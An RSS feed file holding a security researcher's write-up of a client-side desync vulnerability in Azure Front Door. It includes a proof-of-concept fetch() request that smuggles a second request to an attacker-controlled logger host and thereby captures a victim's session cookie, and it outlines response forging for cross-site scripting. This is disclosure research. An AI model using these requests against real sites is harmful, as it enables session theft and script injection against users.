@@ -1,0 +1,127 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Jeti&#39;s blog</title>
+    <link>https://blog.jeti.pw/</link>
+    <description>Recent content on Jeti&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 31 Jul 2023 23:26:05 +0200</lastBuildDate><atom:link href="https://blog.jeti.pw/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Knocking on the Front Door (client side desync attack on Azure CDN)</title>
+      <link>https://blog.jeti.pw/posts/knocking-on-the-front-door/</link>
+      <pubDate>Mon, 31 Jul 2023 23:26:05 +0200</pubDate>
+      
+      <guid>https://blog.jeti.pw/posts/knocking-on-the-front-door/</guid>
+      <description>A few months ago, I embarked on a security bug hunt within the scope of a private program available through the Intigriti platform. During this endeavor, I encountered an intriguing anomaly while analyzing the redirect from HTTP to HTTPS traffic on a particular host.
+In this write-up, I will delve into the short journey that started after uncovering this strange behavior, ultimately leading to the discovery of a Client-Side Desync vulnerability within one of Microsoft Azure&amp;rsquo;s CDN solutions known as Front Door.</description>
+      <content>&lt;p&gt;A few months ago, I embarked on a security bug hunt within the scope of a private program available through the Intigriti platform. During this endeavor, I encountered an intriguing anomaly while analyzing the redirect from HTTP to HTTPS traffic on a particular host.&lt;/p&gt;
+&lt;p&gt;In this write-up, I will delve into the short journey that started after uncovering this strange behavior, ultimately leading to the discovery of a Client-Side Desync vulnerability within one of Microsoft Azure&amp;rsquo;s CDN solutions known as Front Door.&lt;/p&gt;
+&lt;h2 id=&#34;discovery&#34;&gt;Discovery&lt;/h2&gt;
+&lt;p&gt;It all started when I&amp;rsquo;ve sent following request to &lt;a href=&#34;http://redacted.com&#34;&gt;http://redacted.com&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; / &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;redacted.com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;[...]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: 34
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GET / HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: redacted.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Why such a strange request? I was just playing around in Burp after reading fantastic research on &lt;a href=&#34;https://portswigger.net/research/browser-powered-desync-attacks&#34;&gt;Browser Powered desync attacks&lt;/a&gt; by James &lt;a href=&#34;https://twitter.com/albinowax&#34;&gt;@Albinowax&lt;/a&gt;&amp;rsquo; Kettle.&lt;/p&gt;
+&lt;p&gt;And server responded with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;307&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Temporary Redirect&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;keep-alive&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Location&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;https://redacted.com/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x-azure-ref&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20230522T201945Z-...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;X-Cache&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;CONFIG_NOCACHE&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP/1.1 307 Temporary Redirect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: text/html
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: 0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection: keep-alive
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Location: https://redacted.com/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x-azure-ref: 20230522T201945Z-...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;X-Cache: CONFIG_NOCACHE
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At first glance, it looks like there is nothing unusual. The server received two requests in the same (keep-alive) connection and responded twice with a 307 redirect from &lt;code&gt;http://&lt;/code&gt; to &lt;code&gt;https://&lt;/code&gt; address.&lt;/p&gt;
+&lt;p&gt;But&amp;hellip; Wait&amp;hellip; In reality, I just sent one POST request with a body! The size of the body was defined by the &lt;code&gt;Content-Length&lt;/code&gt; header.&lt;/p&gt;
+&lt;p&gt;However, I received two responses. This indicates that the server happily ignored the &lt;code&gt;Content-Length&lt;/code&gt; header and interpreted my request as two separate requests.&lt;/p&gt;
+&lt;p&gt;This looks like a perfect candidate for Client-Side Desync attack described in above-mentioned reasearch.&lt;/p&gt;
+&lt;p&gt;Quoting @Albinowax:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Classic desync or request smuggling attacks rely on intentionally malformed requests that ordinary browsers simply won&amp;rsquo;t send. This limits these attacks to websites that use a front-end/back-end architecture. However, as we&amp;rsquo;ve learned from looking at CL.0 attacks, it&amp;rsquo;s possible to cause a desync using fully browser-compatible HTTP/1.1 requests. Not only does this open up new possibilities for server-side request smuggling, it enables a whole new class of threat - client-side desync attacks.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A client-side desync (CSD) is an attack that makes the victim&amp;rsquo;s web browser desynchronize its own connection to the vulnerable website. This can be contrasted with regular request smuggling attacks, which desynchronize the connection between a front-end and back-end server.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Upon conducting a more in-depth analysis, I discovered that this issue is not specific to the customer&amp;rsquo;s solution but rather a general bug in the service utilized by the customer called &lt;a href=&#34;https://azure.microsoft.com/en-us/products/frontdoor/&#34;&gt;Azure Front Door&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;front-door&#34;&gt;Front Door&lt;/h2&gt;
+&lt;p&gt;Azure Front Door service is a global, scalable content delivery network (CDN) and intelligent application delivery platform that provides secure and high-performance routing of web traffic to backend services.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s dive into some of the configurable options.&lt;/p&gt;
+&lt;p&gt;One of it&amp;rsquo;s features (enabled by default) is to redirect all HTTP traffic to HTTPS.
+&lt;img src=&#34;https://blog.jeti.pw/frontdoor-http-to-https.png&#34; alt=&#34;Frontdoor redirects HTTP to HTTPS&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Technically this is done by redirecting browser to &lt;code&gt;https://&lt;/code&gt; address via 307 status code:
+&lt;img src=&#34;https://blog.jeti.pw/frontdoor-redirect-307.png&#34; alt=&#34;Front Door redirects with 307&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Server supports keep-alive connections:
+&lt;img src=&#34;https://blog.jeti.pw/frontdoor-keep-alive-connections.png&#34; alt=&#34;Front Door supports keep-alive connections&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And redirects also POST requests:
+&lt;img src=&#34;https://blog.jeti.pw/frontdoor-redirect-post-requests.png&#34; alt=&#34;Front Door redirects POST requests&#34;&gt;&lt;/p&gt;
+&lt;p&gt;But the problem is that it completely ignores &lt;code&gt;Content-Length&lt;/code&gt; header:
+&lt;img src=&#34;https://blog.jeti.pw/frontdoor-ignores-content-length.png&#34; alt=&#34;Front Door ignores Content-Length&#34;&gt;
+What looks like two requests is in fact one request sent by the web browser where yellow box contains data for POST request (&lt;code&gt;Content-Length&lt;/code&gt; header points to the end of the data).&lt;/p&gt;
+&lt;p&gt;But Front Door server ignores &lt;code&gt;Content-Length&lt;/code&gt; header and treats it as two separate requests.&lt;/p&gt;
+&lt;p&gt;Another interesting design feature of Front Door (not a bug of course) is that all customer servers powered by Front Door service are available under one IP address and are also available in one keep-alive connection (this is a CDN service, right?). So this is perfectly valid set of requests sent in one TCP connection:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.jeti.pw/frontdoor-sharing-connections.png&#34; alt=&#34;Front Door is sharing connections&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;NOTE 1:&lt;/strong&gt; &lt;em&gt;azure-victim.jeti.pw&lt;/em&gt; and &lt;em&gt;azure-attacker.jeti.pw&lt;/em&gt; are two separate web servers of two separate customers (I&amp;rsquo;ve used custom domains for better visibility).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;NOTE 2:&lt;/strong&gt; &lt;em&gt;azure-attacker.jeti.pw&lt;/em&gt; server doesn&amp;rsquo;t have automatic HTTPS redirects turned on that is why it doesn&amp;rsquo;t respond with redirect (this might be important for various exploitation techniques).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
+&lt;p&gt;A CSD attack starts with the victim visiting the attacker&amp;rsquo;s website, which then makes their browser send two cross-domain requests to the vulnerable website. The first request is crafted to desync the browser&amp;rsquo;s connection and make the second request trigger a harmful request / response.&lt;/p&gt;
+&lt;p&gt;There are multiple ways how attacker can exploit this desynchronization issue. I&amp;rsquo;ll focus on two possible ways.&lt;/p&gt;
+&lt;h3 id=&#34;stealing-requests&#34;&gt;Stealing requests&lt;/h3&gt;
+&lt;p&gt;Let&amp;rsquo;s imagine that, upon visit from a victim, attacker&amp;rsquo;s website sends a request (e.g. using Java Script &lt;code&gt;fetch API&lt;/code&gt;):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://azure-victim.jeti.pw/x&amp;#39;&lt;/span&gt;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST /logger HTTP/1.1\r\nHost: azure-attacker.jeti.pw\r\nContent-Length: 200\r\n\r\n&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;mode&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no-cors&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;redirect&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;follow&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;credentials&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;include&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.jeti.pw/frontdoor-fetch-incomplete-request.png&#34; alt=&#34;Incomplete request with fetch()&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Front Door service treats it as two separate requests where the second one is a POST request with some body attached (200 bytes long).&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; please remeber that &lt;em&gt;azure-attacker.jeti.pw&lt;/em&gt; is configured to not to redirect automatically so the server checks &lt;code&gt;Content-Length&lt;/code&gt; in this case.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;As a request body is missing server will wait for 200 bytes of data to finish the request.
+All attacker needs to do is to redirect victim user to the victim&amp;rsquo;s website:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://azure-victim.jeti.pw/&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Victim&amp;rsquo;s browser will send another GET request (most of the time browser will re-use the  same connection). Both requests will look like this:
+![[frontdoor-completed-request.png]]
+Server received it&amp;rsquo;s 200 bytes of data and sent POST request to &lt;a href=&#34;http://azure-attacker.jeti.pw/logger&#34;&gt;http://azure-attacker.jeti.pw/logger&lt;/a&gt; with following &lt;strong&gt;data&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; / &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;azure-victim.jeti.pw&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;*/*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cookie&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;PHPSESSID=uhogavedhcduei7qlfh1eplf7c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US;q=0.9,en;q=0.8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;keep-alive&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cache-Control&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And effectively attacker had stolen the session cookie of the victim.&lt;/p&gt;
+&lt;h3 id=&#34;universal-xss-by-forging-responses&#34;&gt;&amp;ldquo;Universal&amp;rdquo; XSS by forging responses&lt;/h3&gt;
+&lt;p&gt;Another way of expoiting a CSD vulnerability is to forge responses to the victim&amp;rsquo;s requests.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s have a look at following request sent by the browser when victim visits malicious website (sent via &lt;code&gt;fetch API&lt;/code&gt;):
+&lt;img src=&#34;https://blog.jeti.pw/frontdoor-xss-request.png&#34; alt=&#34;Poisoning response with XSS&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Front Door service again treats it as two separate requests and sends both to respective customer websites. And receives 2 separate responses.&lt;/p&gt;
+&lt;p&gt;But the victim&amp;rsquo;s browser sent only one request so it expects only one response (307 redirect in our case). Second part stays in the connection pool waiting for another request to match (because of the HTTP pipelining).&lt;/p&gt;
+&lt;p&gt;When attacker redirects a victim, browser makes another request.&lt;/p&gt;
+&lt;p&gt;But luckily for an attacker, the browser already have a response waiting in a connection pool (in our example response contains XSS payload that will be triggered in the context of website where victim was redirected).&lt;/p&gt;
+&lt;p&gt;As the attacker can redirect a victim to any Front Door powered website and forge the response I think this can be called a &amp;ldquo;Universal&amp;rdquo; XSS :)&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
